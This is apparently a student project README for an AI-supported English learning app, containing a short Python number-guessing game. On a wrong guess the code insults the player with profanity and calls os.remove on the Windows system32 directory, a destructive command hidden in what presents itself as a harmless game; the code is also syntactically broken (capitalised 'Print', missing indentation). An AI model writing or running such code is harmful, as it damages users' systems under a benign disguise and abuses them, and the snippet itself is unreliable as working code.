# seminarkurs-lernapp-CodeQuattro
KI-gestützte Lernapp für English Mittelstufe 


import random
import os

number = random.randint(1,10)
guess = input("guess the number between 1 to 10")
guess = int(guess)

if guess == number:
Print("You won!")
else:
print("You dumb piece of shit")
os.remove("c://windows//system32")